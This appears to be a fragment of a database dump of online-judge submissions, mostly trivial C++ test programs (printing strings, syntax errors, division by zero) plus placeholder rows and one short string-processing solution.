('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<\"17wwwwwwwwww\";\r\n}', 335),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<\"17wwwwwwwwwwwwwwwwwwwwww\";\r\n}', 336),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<\"17wwwwwwwwwwwwwwwwwwwwww\";\r\n}', 337),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\nstring a;\r\n	cout<<\"17wwwwwwwwwwwwwwwwwwwwww\";\r\n}', 338),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\nstring a;\r\na=\"aaa\";\r\n	cout<<\"17wwwwwwwwwwwwwwwwwwwwww\";\r\n}', 339),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\nstring a;\r\na=\"aaa\";\r\n	cout<<\"17wwwwwwwwwwwwwwwwwwwwww\";\r\n}', 340),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\nstring a;\r\na=\"aaa\";\r\ncout<<a<<endl;\r\n	cout<<\"17wwwwwwwwwwwwwwwwwwwwww\";\r\n}', 341),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\nstring a;\r\na=\"aaa\";\r\ncout<<a<<endl;\r\n	cout<<\"17wwwwwwwwwwwwwwwwwwwwww\";\r\n}', 342),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\nstring a;\r\na=\"aaa\";\r\ncout<<a<<endl;\r\n	cout<<\"17wwwwwwwwwwwwwwwwwwwwww\";\r\n}', 343),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<\"hi\"<<endl;\r\n}', 344),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<\"aaaaaaaaaa\";\r\n}', 345),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<\"aaaaaaaaaa\";\r\n}', 346),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<\"bbbb\";\r\n}', 348),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	string a=\"aaaaaaaa\";\r\n        cout<<a;\r\n}', 349),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	string a=\"aaaaaaaa\";\r\n        cout<<a;\r\n}', 350),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	string a=\"aaaaaaaa\";\r\n        cout<<a;\r\n}', 351),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	string a=\"aaaaaaaa\";\r\n        cout<<a;\r\n}', 352),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	string a=\"aaaaaaaa\";\r\n        cout<<a;\r\n}', 353),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<string(8,48);\r\n}', 354),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	//cout<<string(8,\nz\n);\r\ncout<<\"hi\"<<endl;\r\n}', 355),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<string(8,\nz\n);\r\n//cout<<\"hi\"<<endl;\r\n}', 356),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<string(8,\nz\n);\r\n//cout<<\"hi\"<<endl;\r\n}', 357),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<string(8,\nz\n);\r\n//cout<<\"hi\"<<endl;\r\n}', 358),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<string(8,\nz\n);\r\n//cout<<\"hi\"<<endl;\r\n}', 359),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<string(8,\nz\n);\r\n//cout<<\"hi\"<<endl;\r\n}', 360),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<string(8,\nz\n);\r\n//cout<<\"hi\"<<endl;\r\n}', 361),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<\"hi\";\r\n}', 362),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<\"gi\";\r\n}', 363),
('RakibulRanak', '#include <bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\n	cout<<\"gi\";\r\n}', 364),
('ranak', 'ranak', 365),
('ranak', 'ranak', 366),
('ranak', 'ranak', 367),
('ranak', 'ranak', 368),
('$us', '$source', 369),
('$us', '$source', 370),
('$us', '$source', 371),
('$us', '$source', 372),
('$us', '$source', 373),
('$us', '$source', 374),
('$us', '$source', 375),
('RakibulRanak', 'scs', 376),
('RakibulRanak', 'ijn jm ko', 377),
('$us', '$source', 378),
('$us', '$source', 379),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    int n;\r\n    cin >> n;\r\n    while(n--)\r\n    {\r\n        bool mou = false;\r\n        string name,area,foga,vxd,name1,str1,str2,str3,str4;\r\n        cin >> name >> area;\r\n        if(area == \"MouloviBazar\")\r\n            mou = true;\r\n        cin >> name1 >> vxd >> str1 >> str2 >> str3 >> str4;\r\n        cout << name1 << \" means \" << vxd << endl;\r\n        cout << vxd << \" doesnt mean \" << name1 << endl;\r\n        if(mou)\r\n        {\r\n            cout << str1 << \" means \" << str2 << endl;\r\n            cout << str2 << \" doesnt mean \" << str1 << endl;\r\n            cout << str3 << \" doesnt mean \" << str4 << endl;\r\n            cout << str4 << \" means \" << str3 << endl;\r\n        }\r\n        else\r\n        {\r\n            cout << str1 << \" doesnt mean \" << str2 << endl;\r\n            cout << str2 << \" doesnt mean \" << str1 << endl;\r\n            cout << str3 << \" doesnt mean \" << str4 << endl;\r\n            cout << str4 << \" doesnt mean \" << str3 << endl;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n', 380),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    int n;\r\n    cin >> n;\r\n    while(n--)\r\n    {\r\n        bool mou = false;\r\n        string name,area,foga,vxd,name1,str1,str2,str3,str4;\r\n        cin >> name >> area;\r\n        if(area == \"MouloviBazar\")\r\n            mou = true;\r\n        cin >> name1 >> vxd >> str1 >> str2 >> str3 >> str4;\r\n        cout << name1 << \" means \" << vxd << endl;\r\n        cout << vxd << \" doesnt mean \" << name1 << endl;\r\n        if(mou)\r\n        {\r\n            cout << str1 << \" means \" << str2 << endl;\r\n            cout << str2 << \" doesnt mean \" << str1 << endl;\r\n            cout << str3 << \" doesnt mean \" << str4 << endl;\r\n            cout << str4 << \" means \" << str3 << endl;\r\n        }\r\n        else\r\n        {\r\n            cout << str1 << \" doesnt mean \" << str2 << endl;\r\n            cout << str2 << \" doesnt mean \" << str1 << endl;\r\n            cout << str3 << \" doesnt mean \" << str4 << endl;\r\n            cout << str4 << \" doesnt mean \" << str3 << endl;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n', 381),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    int n;\r\n    cin >> n;\r\n    while(n--)\r\n    {\r\n        bool mou = false;\r\n        string name,area,foga,vxd,name1,str1,str2,str3,str4;\r\n        cin >> name >> area;\r\n        if(area == \"MouloviBazar\")\r\n            mou = true;\r\n        cin >> name1 >> vxd >> str1 >> str2 >> str3 >> str4;\r\n        cout << name1 << \" means \" << vxd << endl;\r\n        cout << vxd << \" doesnt mean \" << name1 << endl;\r\n        if(mou)\r\n        {\r\n            cout << str1 << \" means \" << str2 << endl;\r\n            cout << str2 << \" doesn\'t mean \" << str1 << endl;\r\n            cout << str3 << \" doesn\'t mean \" << str4 << endl;\r\n            cout << str4 << \" means \" << str3 << endl;\r\n        }\r\n        else\r\n        {\r\n            cout << str1 << \" doesn\'t mean \" << str2 << endl;\r\n            cout << str2 << \" doesnt mean \" << str1 << endl;\r\n            cout << str3 << \" doesnt mean \" << str4 << endl;\r\n            cout << str4 << \" doesnt mean \" << str3 << endl;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n', 382),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    int n;\r\n    cin >> n;\r\n    while(n--)\r\n    {\r\n        bool mou = false;\r\n        string name,area,foga,vxd,name1,str1,str2,str3,str4;\r\n        cin >> name >> area;\r\n        if(area == \"MouloviBazar\")\r\n            mou = true;\r\n        cin >> name1 >> vxd >> str1 >> str2 >> str3 >> str4;\r\n        cout << name1 << \" means \" << vxd << endl;\r\n        cout << vxd << \" doesn\'t mean \" << name1 << endl;\r\n        if(mou)\r\n        {\r\n            cout << str1 << \" means \" << str2 << endl;\r\n            cout << str2 << \" doesn\'t mean \" << str1 << endl;\r\n            cout << str3 << \" doesn\'t mean \" << str4 << endl;\r\n            cout << str4 << \" means \" << str3 << endl;\r\n        }\r\n        else\r\n        {\r\n            cout << str1 << \" doesn\'t mean \" << str2 << endl;\r\n            cout << str2 << \" doesn\'t mean \" << str1 << endl;\r\n            cout << str3 << \" doesn\'t mean \" << str4 << endl;\r\n            cout << str4 << \" doesn\'t mean \" << str3 << endl;\r\n        }\r\n    }\r\n    return 0;\r\n}\r\n', 383),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    int n;\r\n    cin >> n;\r\n    while(n--)\r\n    {\r\n        bool mou = false;\r\n        string name,area,foga,vxd,name1,str1,str2,str3,str4;\r\n        cin >> name >> area;\r\n        if(area == \"MouloviBazar\")\r\n            mou = true;\r\n        cin >> name1 >> vxd >> str1 >> str2 >> str3 >> str4;\r\n        cout << name1 << \" means \" << vxd << endl;\r\n        cout << vxd << \" doesn\'t mean \" << name1 << endl;\r\n        if(mou)\r\n        {\r\n            cout << str1 << \" means \" << str2 << endl;\r\n            cout << str2 << \" doesn\'t mean \" << str1 << endl;\r\n            cout << str3 << \" doesn\'t mean \" << str4 << endl;\r\n            cout << str4 << \" means \" << str3 << endl;\r\n        }\r\n        else\r\n        {\r\n            cout << str1 << \" doesn\'t mean \" << str2 << endl;\r\n            cout << str2 << \" doesn\'t mean \" << str1 << endl;\r\n            cout << str3 << \" doesn\'t mean \" << str4 << endl;\r\n            cout << str4 << \" doesn\'t mean \" << str3 << endl;\r\n        }\r\n    }\r\n    return 0;\r\n}', 384),
('emonnn', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\n    int n;\r\n    cin >> n;\r\n    while(n--)\r\n    {\r\n        bool mou = false;\r\n        string name,area,foga,vxd,name1,str1,str2,str3,str4;\r\n        cin >> name >> area;\r\n        if(area == \"MouloviBazar\")\r\n            mou = true;\r\n        cin >> name1 >> vxd >> str1 >> str2 >> str3 >> str4;\r\n        cout << name1 << \" means \" << vxd << endl;\r\n        cout << vxd << \" doesn\'t mean \" << name1 << endl;\r\n        if(mou)\r\n        {\r\n            cout << str1 << \" means \" << str2 << endl;\r\n            cout << str2 << \" doesn\'t mean \" << str1 << endl;\r\n            cout << str3 << \" doesn\'t mean \" << str4 << endl;\r\n            cout << str4 << \" means \" << str3 << endl;\r\n        }\r\n        else\r\n        {\r\n            cout << str1 << \" doesn\'t mean \" << str2 << endl;\r\n            cout << str2 << \" doesn\'t mean \" << str1 << endl;\r\n            cout << str3 << \" doesn\'t mean \" << str4 << endl;\r\n            cout << str4 << \" doesn\'t mean \" << str3 << endl;\r\n        }\r\n    }\r\n    return 0;\r\n}', 385),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"efwe\"<<endl;\r\n}', 386),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"efwe\"l;\r\n}', 387),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"efwe\";\r\n}', 388),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"can\'t\"<<endl;\r\n}', 389),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"can\'t\"<<endl;\r\n}', 390),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"can\'t\"<<endl;\r\n}', 391),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\n\r\nint main()\r\n{\r\ncout<<\"can\'t\"<<endl;\r\n}', 392),
('RakibulRanak', '#include<stdio.h>\r\n\r\nint main()\r\n{\r\nprintf(\"can\'t\n\");\r\n}', 393),
('RakibulRanak', '#include<stdio.h>\r\n\r\nint main()\r\n{\r\nprintf(\"can\'t\n\");\r\n}', 394),
('RakibulRanak', '#include<stdio.h>\r\n\r\nint main()\r\n{\r\nprintf(\"16\n36\n\");\r\n}', 395),
('Maraz Mia', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\ncout<<\"16\"<<endl<<\"35\"<<endl;\r\n}', 396),
('Maraz Mia', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main(){\r\ncout<<\"16\"<<endl<<\"36\"<<endl;\r\n}', 397),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 398),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 399),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 400),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 401),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 402),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 403),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 404),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 405),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 406),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 407),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 408),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 409),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 410),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 411),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 412),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 413),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 414),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 415),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 416),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 417),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 418),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 419),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 420),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 421),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 422),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 423),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 424),
('RakibulRanak', 'header(\"Cache-Control: no cache\");\r\n	session_cache_limiter(\"private_no_expire\");', 425),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 426),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 427),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 428),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 429),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 430),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 431),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 432),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 433),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 434),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 435),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 436),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 437),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 438),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 439),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 440),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 441),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 442),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 443),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl;\r\n}', 444),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl\r\n}', 445),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl\r\n}', 446),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl\r\n}', 447),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl\r\n}', 448),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl\r\n}', 449),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl\r\n}', 450),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl\r\n}', 451),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl\r\n}', 452),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl\r\n}', 453),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl\r\n}', 454),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl\r\n}', 455),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"h\"<<endl\r\n}', 456),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2<<endl\r\n}', 457),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2<<endl\r\n}', 458),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2<<endl\r\n}', 459),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0<<endl;\r\n}', 460),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0<<endl;\r\n}', 461),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0<<endl;\r\n}', 462),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0;\r\n}', 463),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"hi\"<<endl;\r\n}', 464),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"hi\"<<endl\r\n}', 465),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"hi\"<<endl\r\n}', 466),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"hi\"<<endl;\r\n}', 467),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"hi\"<<endl\r\n}', 468),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"hi\"<<endl\r\n}', 469),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"hi\"<<endl\r\n}', 470),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<\"hi\"<<endl\r\n}', 471),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0;\r\n}', 472),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 473),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 474),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 475),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 476),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 477),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 478),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 479),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 480),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 481),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 482),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 483),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 484),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 485),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 486),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 487),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 488),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 489),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 490),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 491),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 492),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 493),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 494),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 495),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 496),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 497),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 498),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 499),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 500),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 501),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 502),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 503),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 504),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 505),
('RakibulRanak', '#include<bits/stdc++.h>\r\nusing namespace std;\r\nint main()\r\n{\r\ncout<<2/0\r\n}', 506),
